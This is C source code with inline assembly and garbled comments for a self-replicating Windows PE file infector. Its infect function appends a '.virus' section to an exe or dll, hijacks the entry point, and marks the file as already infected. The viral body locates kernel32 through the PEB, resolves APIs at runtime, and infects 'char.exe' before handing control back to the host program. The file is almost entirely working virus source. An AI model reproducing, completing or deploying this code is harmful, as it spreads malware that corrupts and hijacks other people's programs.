// ��VC6.0�������±���ͨ��������xp sp2�³ɹ���Ⱦexe��dll�ļ� 
// ��������3296�ֽ� 

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

//#define _DEBUG_

#define WORD4(a,b,c,d) ((a)+(b)*0x100+(c)*0x10000+(d)*0x1000000)
#define ALIGN(a,b) (((a-1) | (b-1))+1)

#pragma warning(disable:4996)

// UNICODE_STRING�ڻ�ȡkernel32.dllʱҪʹ�ã�ϵͳ�ĺ��Ľṹ�壨PEB��ʹ��UNICODE���� 
#ifndef UNICODE_STRING
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;

typedef LSA_UNICODE_STRING UNICODE_STRING, *PUNICODE_STRING;
#endif

//ָ������ָ�붨�� 
typedef void *(*FNReLocal)(void *start);
typedef DWORD(*FNGetKrnlBase)(void); //��ȡKernel32.dll�Ļ���ַ
typedef int(*FNMyStrLen)(const char *pStr);
typedef int(*FNMyStrCmp)(const char *str1, const char *str2);
typedef void(*FNMyStrCpy)(char *dst, const char *src);
typedef void(*FNMyStrCat)(char *dst, const char *src);
typedef DWORD(*FNGetApiAddr)(DWORD dwBaseAddr, const char *strAPI);
typedef struct tagFUNC *LPFUNC;
typedef int(*FNSeekAndRead)(LPFUNC, HANDLE, int, char *, int);
typedef int(*FNSeekAndWrite)(LPFUNC, HANDLE, int, const char *, int);
typedef int(*FNinfect)(LPFUNC, const char *);
typedef void(*FNLastFun)(void);
//////////////////////////////////////////////////////////////////////////
typedef HANDLE(WINAPI *FNCreateFile)(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI *FNCloseHandle)(HANDLE);
typedef BOOL(WINAPI *FNReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI *FNWriteFile)(HANDLE, const void *, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD(WINAPI *FNSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef DWORD(WINAPI *FNGetFileSize)(HANDLE, LPDWORD);
typedef FARPROC(WINAPI *FNGetProcAddress)(HMODULE, const char *);
typedef HINSTANCE(WINAPI *FNLoadLibrary)(const char*);
typedef void (WINAPI *FNExitProcess)(UINT);
typedef int (WINAPI *FNMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);
typedef HMODULE(WINAPI *FNGetModuleHandle)(LPCTSTR);
typedef BOOL(WINAPI *FNFreeLibrary)(HMODULE);
typedef BOOL(WINAPI *FNSetEndOfFile)(HANDLE);
typedef DWORD(WINAPI *FNGetTickCount)(void); //
typedef HANDLE(WINAPI *FNCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,
	LPVOID, DWORD, LPDWORD);

//�൱�ڵ������ 
typedef struct tagFUNC
{
	FNReLocal _ReLocal;
	FNGetKrnlBase _GetKrnlBase;
	FNMyStrLen _MyStrLen;
	FNMyStrCmp _MyStrCmp;
	FNMyStrCpy _MyStrCpy;
	FNMyStrCat _MyStrCat;
	FNGetApiAddr _GetApiAddr;
	FNSeekAndRead _SeekAndRead;
	FNSeekAndWrite _SeekAndWrite;
	FNinfect _infect;
	FNLastFun _LastFun;
	//////////////////////////////////////////////////////////////////////////
	FNCreateFile _CreateFile;
	FNCloseHandle _CloseHandle;
	FNReadFile _ReadFile;
	FNWriteFile _WriteFile;
	FNSetFilePointer _SetFilePointer;
	FNGetFileSize _GetFileSize;
	FNGetProcAddress _GetProcAddress;
	FNLoadLibrary _LoadLibrary;
	FNExitProcess _ExitProcess;
	FNMessageBox _MessageBox;
	FNGetModuleHandle _GetModuleHandle;
	FNFreeLibrary _FreeLibrary;
	FNSetEndOfFile _SetEndOfFile;
} FUNC, *LPFUNC;

//��������ǰ���� 
BOOL WINAPI MyEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
void *ReLocal(void *start); //�ض�λ����
DWORD GetKrnlBase(void); //��ȡKernel32.dll�Ļ���ַ
int MyStrLen(const char *pStr);
int MyStrCmp(const char *str1, const char *str2);
void MyStrCpy(char *dst, const char *src);
void MyStrCat(char *dst, const char *src);
DWORD GetApiAddr(DWORD dwBaseAddr, const char *strAPI);
int SeekAndRead(LPFUNC func, HANDLE file, int offset, char *buffer, int size);
int SeekAndWrite(LPFUNC func, HANDLE file, int offset, const char *buffer, int size);
int infect(LPFUNC func, const char *name);
void LastFun(void);

//�˺����൱��DLL��DllMain���� 
BOOL WINAPI MyEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	FUNC func;
	DWORD dwBase, dwKrnlBase, dwBaseUser32, dwBaseGdi32, dwOriEntryPoint;
	char szFileName[260] = { 0 };
	//���е�dll �� dll�е�api������������ȫ���ڶ�ջ������ 
	DWORD dwUser32dll[] = { 'resu', 'd.23', 'll' }; //"User32.dll"
	DWORD dwGdi32dll[] = { '3idg', 'ld.2', 'l' };
	DWORD dwCreateFile[] = { 'aerC', 'iFet', 'Ael' }; //"CreateFileA"�ַ������� 
	DWORD dwCloseHandle[] = { 'solC', 'naHe', 'eld' };
	DWORD dwReadFile[] = { 'daeR', 'eliF', 0 };
	DWORD dwWriteFile[] = { 'tirW', 'liFe', 'e' };
	DWORD dwSetFilePointer[] = { 'FteS', 'Peli', 'tnio', 're' };
	DWORD dwGetFileSize[] = { 'FteG', 'Seli', 'ezi' };
	DWORD dwGetProcAddress[] = { 'PteG', 'Acor', 'erdd', 'ss' };
	DWORD dwLoadLibrary[] = { 'daoL', 'rbiL', 'Ayra', 0 };
	DWORD dwExitProcess[] = { 'tixE', 'corP', 'sse' };
	DWORD dwMessageBox[] = { 'sseM', 'Bega', 'Axo' };
	DWORD dwGetModuleHandle[] = { 'MteG', 'ludo', 'naHe', 'Aeld', 0 };
	DWORD dwFreeLibrary[] = { 'eerF', 'rbiL', 'yra' };
	DWORD dwSetEndOfFile[] = { 'EteS', 'fOdn', 'eliF', 0 };
	__asm //�����ض�λ
	{
		call label1
		label1 : pop ebx
				 sub ebx, offset label1
				 mov dwBase, ebx
	}
	func._ReLocal = (FNReLocal)(dwBase + (DWORD)ReLocal); //��ȡReLocal������ʵ��ַ,��ͬ 
	func._GetKrnlBase = (FNGetKrnlBase)(dwBase + (DWORD)GetKrnlBase);
	func._MyStrLen = (FNMyStrLen)(dwBase + (DWORD)MyStrLen);
	func._MyStrCmp = (FNMyStrCmp)(dwBase + (DWORD)MyStrCmp);
	func._MyStrCpy = (FNMyStrCpy)(dwBase + (DWORD)MyStrCpy);
	func._MyStrCat = (FNMyStrCat)(dwBase + (DWORD)MyStrCat);
	func._GetApiAddr = (FNGetApiAddr)(dwBase + (DWORD)GetApiAddr);
	func._SeekAndRead = (FNSeekAndRead)(dwBase + (DWORD)SeekAndRead);
	func._SeekAndWrite = (FNSeekAndWrite)(dwBase + (DWORD)SeekAndWrite);
	func._infect = (FNinfect)(dwBase + (DWORD)infect);
	func._LastFun = (FNLastFun)(dwBase + (DWORD)LastFun);
#ifdef _DEBUG_	
	printf("%X, %X, %X, %X, %X, %X, %X\n", func._ReLocal, func._GetKrnlBase,
		func._MyStrLen, func._MyStrCmp, func._MyStrCpy, func._MyStrCat, func._GetApiAddr);
	printf("%X, %X, %X, %X, %X, %X, %X\n", ReLocal, GetKrnlBase, MyStrLen,
		MyStrCmp, MyStrCpy, MyStrCat, GetApiAddr);
#endif

	dwKrnlBase = func._GetKrnlBase(); //��ȡkernel32.dllӳ���ַ 
	// kernel32.dll���api 
	func._CreateFile = (FNCreateFile)func._GetApiAddr(dwKrnlBase, (char *)dwCreateFile);
	func._CloseHandle = (FNCloseHandle)func._GetApiAddr(dwKrnlBase, (char *)dwCloseHandle);
	func._ReadFile = (FNReadFile)func._GetApiAddr(dwKrnlBase, (char *)dwReadFile);
	func._WriteFile = (FNWriteFile)func._GetApiAddr(dwKrnlBase, (char *)dwWriteFile);
	func._SetFilePointer = (FNSetFilePointer)func._GetApiAddr(dwKrnlBase, (char *)dwSetFilePointer);
	func._GetFileSize = (FNGetFileSize)func._GetApiAddr(dwKrnlBase, (char *)dwGetFileSize);
	func._GetProcAddress = (FNGetProcAddress)func._GetApiAddr(dwKrnlBase, (char *)dwGetProcAddress);
	func._LoadLibrary = (FNLoadLibrary)func._GetApiAddr(dwKrnlBase, (char *)dwLoadLibrary);
	func._ExitProcess = (FNExitProcess)func._GetApiAddr(dwKrnlBase, (char *)dwExitProcess);
	func._GetModuleHandle = (FNGetModuleHandle)func._GetApiAddr(dwKrnlBase, (char *)dwGetModuleHandle);
	func._FreeLibrary = (FNFreeLibrary)func._GetApiAddr(dwKrnlBase, (char *)dwFreeLibrary);
	func._SetEndOfFile = (FNSetEndOfFile)func._GetApiAddr(dwKrnlBase, (char *)dwSetEndOfFile);

	// user32.dll���api
	dwBaseUser32 = (DWORD)func._LoadLibrary((char *)dwUser32dll);
	func._MessageBox = (FNMessageBox)func._GetApiAddr(dwBaseUser32, (char *)dwMessageBox);

	// gdi32.dll���api
	dwBaseGdi32 = (DWORD)func._LoadLibrary((char *)dwGdi32dll);

	*(DWORD*)&szFileName[0] = WORD4('c', 'h', 'a', 'r');
	*(DWORD*)&szFileName[4] = WORD4('.', 'e', 'x', 'e');
	func._MessageBox(NULL, szFileName, NULL, 0); //������Ϣ�� 
	func._infect(&func, szFileName); //��ȾszFileName��ָ�����ļ� 

	// �ͷ��ڴ�
	func._FreeLibrary((HMODULE)dwBaseGdi32);
	func._FreeLibrary((HMODULE)dwBaseUser32);
	dwOriEntryPoint = *(DWORD*)func._LastFun;
	if (*((DWORD*)func._LastFun + 1)) //����DLL�ļ�
		dwOriEntryPoint += (DWORD)hinstDLL;
	else
		dwOriEntryPoint += (DWORD)func._GetModuleHandle(NULL);
	//	__try
	//	{

	BOOL(WINAPI *MainDLL)(HANDLE, DWORD, LPVOID) = (BOOL(WINAPI*)(HANDLE, DWORD, LPVOID))dwOriEntryPoint;
	return MainDLL(hinstDLL, fdwReason, lpvReserved); //��ת������Ⱦ���ļ���ԭʼ����ڼ���ִ�� 
	//	}
	//	__except(EXCEPTION_EXECUTE_HANDLER)
	//	{}
}

//�����ض�λ�ĺ��� 
void *ReLocal(void *start)
{
	__asm
	{
		call label1
		label1 : pop eax
				 sub eax, offset label1
				 add eax, start
	}
}

//��ȡkernel32.dll���ڴ�ĵ�ַ 
DWORD GetKrnlBase(void)
{
	//��ʹ������ע�͵Ĵ����ȡKernel32.dll�Ļ�ַ����Ϊ�˴�����Windows7�»�ȡ�Ĳ�����kernel32.dll�Ļ���ַ 
	//	__asm
	//	{
	//		mov eax, fs:[30h] ;//Get PEB
	//		mov eax, [eax+0ch] ;//Get _PEB_LDR_DATA
	//		mov eax, [eax+1ch] ;//Get InInitializationOrderModuleList.Flink, 
	//		;//��ʱeaxָ�����ntdllģ���InInitializationOrderModuleList���Ե�ַ��
	//		;//�������ǻ��������һ������kernel32.dll
	//		mov eax, [eax]
	//		mov eax, [eax+8h];//8 = sizeof.LIST_ENTRY
	//	}
	DWORD dwKernel32_dll[] = { WORD4('k', 'e', 'r', 'n'), WORD4('e', 'l', '3', '2'), WORD4('.', 'd', 'l', 'l'), 0 };
	USHORT usLen = 12;
	PBYTE pb, pt;
	__asm
	{
		mov ebx, fs:[30h];//Get PEB
		mov ebx, [ebx + 0ch];//Get _PEB_LDR_DATA
		mov ebx, [ebx + 1ch];//Get InInitializationOrderModuleList.Flink, 
		mov pb, ebx;
	}
	pt = pb;
	do
	{
		PUNICODE_STRING pwStr = (PUNICODE_STRING)(DWORD *)(pb + 0x1c); //��ȡdll������ 
		//wprintf(L"Len=%d, name=%s", pwStr->Length, pwStr->Buffer) ;
		//printf(" Address=%X\n", *(DWORD *)(pb+8)) ;
		// ������Ҫ���ľ��ǣ��ж�dll�������ǲ��ǡ�kernel32.dll�� 
		if (pwStr->Length == 24)
		{
			int i, j;
			for (i = 0, j = 0; i<12; ++i)
			{
				j = ((char *)dwKernel32_dll)[i] - pwStr->Buffer[i];
				if (j != 0 && j != 32) break;
			}
			if (i == 12)
				return *(DWORD *)(pb + 8); //����kernel32.dll�Ļ���ַ
		}
		pb = (PBYTE)*(DWORD *)pb;
	} while (pb != pt);
	return 0;
}

// �Լ���strlen���� 
int MyStrLen(const char *pStr)
{
	int iLen = 0;
	while (*pStr++) iLen++;
	return iLen;
}

// �Լ���strcmp���� 
int MyStrCmp(const char *str1, const char *str2)
{
	int i;
	if (!str1 && !str2)
		return 0;
	if (!str1) return -1;
	if (!str2) return 1;
	while (*str1 && *str2)
	{
		i = (*str1++) - (*str2++);
		if (i > 0) return 1;
		else if (i < 0) return -1;
	}
	if (*str1) return 1;
	if (*str2) return -1;
	return 0;
}

// �Լ���strcpy���� 
void MyStrCpy(char *dst, const char *src)
{
	while (*dst++ = *src++);
}


//�Լ���strcat���� 
void MyStrCat(char *dst, const char *src)
{
	while (*dst) dst++;
	strcpy(dst, src);/////////////////////////////////////////////
}

//��ȡapi�ĵ�ַ
// dwBaseAddr��dll�����ڴ��ĵ�ַ strAPI�Ǻ����� 
DWORD GetApiAddr(DWORD dwBaseAddr, const char *strAPI)
{
	IMAGE_DOS_HEADER *pidh = NULL;
	IMAGE_NT_HEADERS *pinh = NULL;
	IMAGE_DATA_DIRECTORY *pSymbolTable = NULL;
	IMAGE_EXPORT_DIRECTORY *pied = NULL;
	int NumberOfNames, i;
	char *pName = NULL;

	if (!strAPI) return 0;
	pidh = (IMAGE_DOS_HEADER *)dwBaseAddr;
	pinh = (IMAGE_NT_HEADERS *)((DWORD)dwBaseAddr + pidh->e_lfanew);
	pSymbolTable = &pinh->OptionalHeader.DataDirectory[0];
	pied = (IMAGE_EXPORT_DIRECTORY *)((DWORD)dwBaseAddr + pSymbolTable->VirtualAddress);
#ifdef _DEBUG_
	printf("NumberOfNames=0x%X, NumberOfFunctions=0x%X\n", pied->NumberOfNames, pied->NumberOfFunctions);
	printf("Base = %X\n", pied->Base);
	printf("Name = %s\n", dwBaseAddr + pied->Name); // "kernel32.dll"
#endif
	NumberOfNames = pied->NumberOfNames;
	for (i = 0; i<NumberOfNames; ++i)
	{
#ifdef _DEBUG_
		printf("Ori=%04X, ", *((WORD *)(dwBaseAddr + pied->AddressOfNameOrdinals) + i) + pied->Base);
		printf("Name=%s, ", dwBaseAddr + *((DWORD *)(dwBaseAddr + pied->AddressOfNames) + i));
		printf("Address=%X\n", dwBaseAddr + (*((DWORD *)(dwBaseAddr + pied->AddressOfFunctions) + *((WORD *)(dwBaseAddr + pied->AddressOfNameOrdinals) + i))));
#endif
		pName = (char *)(dwBaseAddr + *((DWORD *)(dwBaseAddr + pied->AddressOfNames) + i)); //������ַ
		if (MyStrCmp(strAPI, pName) == 0)
			return dwBaseAddr + (*((DWORD *)(dwBaseAddr + pied->AddressOfFunctions) + *((WORD *)(dwBaseAddr + pied->AddressOfNameOrdinals) + i)));
	}
	return 0;
}

// ��λ��ָ����λ�ã��ٶ�ȡ�ļ� 
int SeekAndRead(LPFUNC pfunc, HANDLE hFile, int offset, char *buffer, int size)
{
	unsigned long len;
	pfunc->_SetFilePointer(hFile, offset, NULL, FILE_BEGIN);
	if (!pfunc->_ReadFile(hFile, buffer, size, &len, NULL))
		return 0;
	return len;
}

// ��λ��ָ����λ�ã���д���ļ�
int SeekAndWrite(LPFUNC pfunc, HANDLE hFile, int offset, const char *buffer, int size)
{
	unsigned long len;
	pfunc->_SetFilePointer(hFile, offset, NULL, FILE_BEGIN);
	if (!pfunc->_WriteFile(hFile, buffer, size, &len, NULL))
		return 0;
	return len;
}


//��ȾPE�ļ��ĺ�����name�ƶ�PE�ļ���
int infect(LPFUNC pfunc, const char *name)
{
	HANDLE hFile;
	int res = 0;
	// MS-DOSͷ��64���ֽ�   object�����ͷ��Ϣ�Ļ�������40���ֽڣ�
	char MZ[0x40], PE[0x100], object[0x28];
	unsigned pe_header; //ָ��PE�ļ�ͷ

	hFile = pfunc->_CreateFile(name, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return 0;
	if (pfunc->_SeekAndRead(pfunc, hFile, 0, MZ, 0x40)) //��ȡMS-DOSͷ��
	{
		// ��λPE�ļ�ͷ������ȡ��PE�ļ�ͷ����ʼ��256�ֽڣ������ڻ�����PE��
		if (pfunc->_SeekAndRead(pfunc, hFile, pe_header = *(unsigned*)(MZ + 0x3C), PE, 0x100))
		{
			// PE+8 ָ��TimeDateStamp �ļ�������ʱ��(����־λ)
			if (*(unsigned*)(PE + 8) != 0x98765432 && *(unsigned*)PE == WORD4('P', 'E', 0, 0))
			{
				// *(unsigned short*)(PE+0x14)��ѡͷ�ĳ���  pe_header+0x18�պ�ָ���ѡͷ�ĵ�һ����Ա
				// o_object��ֵΪ����һ������ͷ��ƫ����
				unsigned o_object = pe_header + *(unsigned short*)(PE + 0x14) + 0x18;

				// *(unsigned short*)(PE+6)Ϊ�ڵ������� 0x28Ϊ��ͷ�Ĵ�С
				if (pfunc->_SeekAndRead(pfunc, hFile, o_object + *(unsigned short*)(PE + 6) * 0x28, object, 0x28))
				{
					int i;
					char r;
					for (r = i = 0; i < 0x28; i++)
						r |= object[i]; //
					// �����пռ�������һ���µĽ�ͷ
					if (!r)
					{
						DWORD dwOldEntryPoint = 0;
						for (unsigned short k = 0; k < *(unsigned short*)(PE + 6); k++)
						{
							pfunc->_SeekAndRead(pfunc, hFile, o_object + k * 0x28, object, 0x28);
							object[0x27] |= 0xC0; //�ı�Characteristics������
							//�����ļ�
							pfunc->_SeekAndWrite(pfunc, hFile, o_object + k * 0x28, object, 0x28);
						}
						*(unsigned*)(PE + 8) = 0x98765432;

						// �������Ϊ.virus���½�
						*(unsigned*)(object) = WORD4('.', 'v', 'i', 'r');
						*(unsigned*)(object + 4) = WORD4('u', 's', 0, 0);

						unsigned virsize = (unsigned)LastFun - (unsigned)MyEntryPoint,
							// *(unsigned*)(PE+0x38) �μ��غ����ڴ��еĶ��뷽ʽ
							virtsize = ALIGN(virsize + 8, *(unsigned*)(PE + 0x38)), //��8�ֽڣ�4�ֽ�ԭʼ����ڣ�4�ֽڴ洢����Ⱦ���ǲ���DLL�ļ� 
							// *(unsigned*)(PE+0x50)-->SizeOfImage
							startRVA = *(unsigned*)(PE + 0x50), //�����ڵ���ʼλ��
							// *(unsigned*)(PE+0x3c) �����ļ��еĶ��뷽ʽ
							physsize = ALIGN(virsize + 8, *(unsigned*)(PE + 0x3c)),
							FileSize = ALIGN(pfunc->_GetFileSize(hFile, NULL), *(unsigned*)(PE + 0x3c));

						//dwOldEntryPoint = *(unsigned*)(PE+0x34) ; //ImageBaseӳ���ַ 

						*(unsigned*)(object + 8) = virtsize;    //�ڵ���ʵ����
						*(unsigned*)(object + 0x0c) = startRVA; //�ڵ�RVA
						*(unsigned*)(object + 0x10) = physsize; //�ڵ�������
						*(unsigned*)(object + 0x14) = FileSize; //�ڻ����ļ���ƫ����
						//������
						*(unsigned*)(object + 0x24) = 0xE0000020; // flags: code section, read, write, execute

						//*(unsigned*)(PE+0x1c) += physsize; // sizeof code
						//*(unsigned*)(PE+0x20) += physsize; // Size Of InitialishedData
						*(unsigned*)(PE + 0x50) += virtsize; //*(unsigned*)(PE+0x50)��������ռ���ڴ��С
						dwOldEntryPoint = *(unsigned*)(PE + 0x28);
						*(unsigned*)(PE + 0x28) = startRVA; /*��д�������ڵ�*/
						pfunc->_SeekAndWrite(pfunc, hFile, o_object + *(unsigned short*)(PE + 6) * 0x28, object, 0x28); //д���½�ͷ
						(*(unsigned short*)(PE + 6))++; // ��������1

						pfunc->_SeekAndWrite(pfunc, hFile, pe_header, PE, 0x100);
						pfunc->_SeekAndWrite(pfunc, hFile, FileSize, (char*)pfunc->_ReLocal(MyEntryPoint), virsize);
						pfunc->_SeekAndWrite(pfunc, hFile, FileSize + virsize, (char*)&dwOldEntryPoint, 4); //д�뱻��Ⱦ���ļ���ԭʼ��� 
						i = 0;
						if (*(USHORT*)(PE + 0x16) & IMAGE_FILE_DLL) // Characteristics
							i = 0xd11; //˵������Ⱦ�Ŀ�ִ���ļ���DLL����̬���ӿ��ļ���
						pfunc->_SeekAndWrite(pfunc, hFile, FileSize + virsize + 4, (char*)&i, 4);
						pfunc->_SetFilePointer(hFile, FileSize + physsize, NULL, FILE_BEGIN);
						pfunc->_SetEndOfFile(hFile);
						res = 1;
					}
				}
			}
		}
	}
	pfunc->_CloseHandle(hFile);
	return res;
}

void LastFun(void) {} //��־�����嵽�˽��� 

int main(int argc, char *argv[])
{
	FUNC func;
#ifdef _DEBUG_
	printf("%X, %X, %X, %X, %X, %X, %X, %X, %X, %X, %X\n",
		ReLocal, GetKrnlBase, MyStrLen, MyStrCmp, MyStrCpy, MyStrCat,
		GetApiAddr, SeekAndRead, SeekAndWrite, infect, LastFun);
#endif
	if (argc < 2)
	{
		printf("Useage: %s [exefile | dllfile]\n", argv[0]);
		return 0;
	}
	func._ReLocal = ReLocal;
	func._GetKrnlBase = GetKrnlBase;
	func._MyStrLen = MyStrLen;
	func._MyStrCmp = MyStrCmp;
	func._MyStrCpy = MyStrCpy;
	func._MyStrCat = MyStrCat;
	func._GetApiAddr = GetApiAddr;
	func._SeekAndRead = SeekAndRead;
	func._SeekAndWrite = SeekAndWrite;
	func._infect = infect;
	func._LastFun = LastFun;
	func._CreateFile = CreateFileA;
	func._CloseHandle = CloseHandle;
	func._ReadFile = ReadFile;
	func._WriteFile = WriteFile;
	func._SetFilePointer = SetFilePointer;
	func._GetFileSize = GetFileSize;
	func._GetProcAddress = GetProcAddress;
	func._LoadLibrary = LoadLibraryA;
	func._ExitProcess = ExitProcess;
	func._MessageBox = MessageBoxA;
	func._GetModuleHandle = GetModuleHandleA;
	func._FreeLibrary = FreeLibrary;
	func._SetEndOfFile = SetEndOfFile;
	infect(&func, argv[1]); //�Բ���ָ�����ļ����и�Ⱦ 
	return 0;
}
